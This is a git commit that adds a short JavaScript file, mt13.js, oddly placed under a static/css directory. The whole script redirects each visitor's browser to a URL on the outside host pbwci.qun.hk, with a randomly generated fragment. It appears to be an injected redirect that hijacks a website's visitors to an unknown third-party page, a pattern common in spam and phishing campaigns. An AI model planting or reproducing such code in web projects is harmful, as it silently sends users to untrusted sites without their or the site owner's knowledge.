552a7fdf5507098eefd19672c5bb1a9b6b390cad
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-06-26 00:07:05 +0800

    Create mt13.js

---
+++ static/css/mt13.js
@@ -0,0 +1,15 @@
+var urls=[' http://pbwci.qun.hk./Fonsm0wu3XVypnx149GQ-gRYQwUi#{nnnnnnn}{wwww}',];
+location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
+}
